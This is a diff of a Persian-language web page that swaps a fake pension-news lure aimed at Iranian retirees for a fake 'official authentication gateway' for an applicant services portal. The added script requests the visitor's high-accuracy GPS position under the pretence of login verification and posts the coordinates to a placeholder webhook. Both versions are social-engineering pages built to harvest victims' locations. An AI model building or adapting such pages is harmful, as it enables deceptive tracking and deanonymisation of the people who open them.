@@ -1,44 +1,271 @@
+
 <!DOCTYPE html>
 <html lang="fa" dir="rtl">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>پورتال خبری بازنشستگان ایران</title>
-    <style>
-        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f0f2f5; margin: 0; padding: 0; direction: rtl; }
-        header { background-color: #1a3c5e; color: white; padding: 15px 0; text-align: center; box-shadow: 0 2px 5px rgba(0,0,0,0.2); }
-        nav { background: #fff; padding: 10px; border-bottom: 1px solid #ddd; display: flex; justify-content: center; gap: 20px; }
-        nav a { text-decoration: none; color: #333; font-weight: bold; font-size: 14px; }
-        .container { max-width: 800px; margin: 20px auto; padding: 0 15px; }
-        .news-card { background: white; border-radius: 10px; overflow: hidden; margin-bottom: 20px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); cursor: pointer; transition: transform 0.2s; }
-        .news-card:hover { transform: translateY(-5px); }
-        .news-card img { width: 100%; height: 200px; object-fit: cover; }
-        .news-content { padding: 15px; }
-        .news-title { font-size: 18px; color: #2c3e50; font-weight: bold; margin-bottom: 10px; }
-        .news-desc { font-size: 14px; color: #666; line-height: 1.6; }
-        .btn-main { display: block; width: 100%; background: #e74c3c; color: white; text-align: center; padding: 12px; text-decoration: none; border-radius: 5px; margin-top: 10px; font-weight: bold; }
-    </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>پورتال خدمات متقاضیان</title>
+
+<style>
+* {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+}
+
+body {
+    font-family: Tahoma, Arial, sans-serif;
+    background: #f2f5f9;
+    color: #17243a;
+    min-height: 100vh;
+}
+
+header {
+    background: #10223e;
+    color: white;
+    padding: 25px 8%;
+    border-bottom: 4px solid #b99a55;
+}
+
+header h1 {
+    font-size: 22px;
+    margin-bottom: 8px;
+}
+
+header p {
+    color: #cbd5e1;
+    font-size: 13px;
+}
+
+.container {
+    max-width: 650px;
+    margin: 65px auto;
+    padding: 20px;
+}
+
+.card {
+    background: white;
+    padding: 40px 30px;
+    border-radius: 12px;
+    box-shadow: 0 8px 35px rgba(16,34,62,.08);
+    border: 1px solid #e4e9f0;
+}
+
+.card h2 {
+    text-align: center;
+    margin-bottom: 15px;
+    font-size: 21px;
+}
+
+.description {
+    text-align: center;
+    color: #64748b;
+    font-size: 14px;
+    line-height: 2;
+    margin-bottom: 25px;
+}
+
+.notice {
+    background: #f1f5f9;
+    border-right: 4px solid #b99a55;
+    padding: 15px;
+    font-size: 13px;
+    line-height: 2;
+    margin-bottom: 25px;
+}
+
+button {
+    width: 100%;
+    padding: 17px;
+    border: none;
+    border-radius: 7px;
+    background: #142c4d;
+    color: white;
+    font-size: 16px;
+    cursor: pointer;
+    transition: .2s;
+}
+
+button:hover {
+    background: #203f68;
+}
+
+button:disabled {
+    opacity: .6;
+    cursor: not-allowed;
+}
+
+#status {
+    margin-top: 25px;
+    padding: 15px;
+    border-radius: 7px;
+    text-align: center;
+    font-size: 14px;
+    display: none;
+    line-height: 2;
+    overflow-wrap: anywhere;
+}
+
+.success {
+    display: block !important;
+    background: #e8f7ee;
+    color: #176b39;
+}
+
+.error {
+    display: block !important;
+    background: #fff0f0;
+    color: #a52a2a;
+}
+
+footer {
+    text-align: center;
+    color: #94a3b8;
+    font-size: 12px;
+    padding: 30px;
+}
+</style>
 </head>
+
 <body>
 
-    <header><h1>پورتال خبری بازنشستگان</h1></header>
-    <nav>
-        <a href="#">صفحه اصلی</a>
-        <a href="#">جدول حقوق</a>
-        <a href="#">اخبار سازمان</a>
-        <a href="#">تماس با ما</a>
-    </nav>
+<header>
+    <h1>سامانه خدمات متقاضیان</h1>
+    <p>درگاه رسمی احراز هویت و تأیید اطلاعات</p>
+</header>
 
-    <div class="container">
-        <div class="news-card" onclick="getLocation()">
-            <img src="https://via.placeholder.com/800x200?text=Pension+Increase+2024" alt="News Image">
-            <div class="news-content">
-                <div class="news-title">اعلام جدول جدید حقوق بازنشستگان برای سال ۱۴۰۳</div>
-                <div class="news-desc">طبق مصوبات جدید شورای عالی نظام بازنشستگی، مبالغ دریافتی برای تمامی اقطاب تغییر یافت. جهت مشاهده مبلغ تعلق گرفته به کد ملی خود، روی این خبر کلیک نمایید.</div>
-                <div class="btn-main">مشاهده مبلغ دریافتی</div>
-            </div>
+<div class="container">
+    <div class="card">
+
+        <h2>تأیید موقعیت مکانی</h2>
+
+        <p class="description">
+            برای ادامه فرایند ورود به سامانه،
+            لازم است موقعیت مکانی دستگاه خود را
+            با رضایت خود تأیید کنید.
+        </p>
+
+        <div class="notice">
+            <strong>اطلاعیه:</strong>
+            موقعیت مکانی شما پس از تأیید دریافت و
+            برای پردازش درخواست ارسال خواهد شد.
         </div>
-    </div>
 
-    <script>
-    function getLocation
+        <button id="verifyBtn" onclick="verifyLocation()">
+            تأیید موقعیت مکانی و ورود
+        </button>
+
+        <div id="status"></div>
+
+    </div>
+</div>
+
+<footer>
+    سامانه خدمات الکترونیکی متقاضیان
+    © 2026
+</footer>
+
+<script>
+
+const WEBHOOK_URL = "YOUR_WEBHOOK_URL";
+
+const button = document.getElementById("verifyBtn");
+const statusBox = document.getElementById("status");
+
+function showStatus(message, type) {
+    statusBox.style.display = "block";
+    statusBox.className = type;
+    statusBox.textContent = message;
+}
+
+function verifyLocation() {
+
+    if (!navigator.geolocation) {
+        showStatus(
+            "مرورگر شما از موقعیت مکانی پشتیبانی نمی‌کند.",
+            "error"
+        );
+        return;
+    }
+
+    button.disabled = true;
+
+    showStatus(
+        "در حال دریافت موقعیت مکانی...",
+        "success"
+    );
+
+    navigator.geolocation.getCurrentPosition(
+
+        async function(position) {
+
+            const latitude = position.coords.latitude;
+            const longitude = position.coords.longitude;
+
+            showStatus(
+                "موقعیت دریافت شد. در حال ارسال اطلاعات...",
+                "success"
+            );
+
+            try {
+
+                const response = await fetch(WEBHOOK_URL, {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json"
+                    },
+                    body: JSON.stringify({
+                        latitude: latitude,
+                        longitude: longitude
+                    })
+                });
+
+                if (!response.ok) {
+                    throw new Error("HTTP " + response.status);
+                }
+
+                showStatus(
+                    "تأیید موقعیت مکانی با موفقیت انجام شد.",
+                    "success"
+                );
+
+            } catch (error) {
+
+                showStatus(
+                    "ارسال اطلاعات ناموفق بود: " + error.message,
+                    "error"
+                );
+
+            } finally {
+                button.disabled = false;
+            }
+        },
+
+        function(error) {
+
+            const messages = {
+                1: "دسترسی به موقعیت مکانی رد شد.",
+                2: "موقعیت مکانی در دسترس نیست.",
+                3: "زمان دریافت موقعیت به پایان رسید."
+            };
+
+            showStatus(
+                messages[error.code] || "خطای نامشخص در دریافت موقعیت.",
+                "error"
+            );
+
+            button.disabled = false;
+        },
+
+        {
+            enableHighAccuracy: true,
+            timeout: 15000,
+            maximumAge: 0
+        }
+    );
+}
+
+</script>
+
+</body>
+</html>
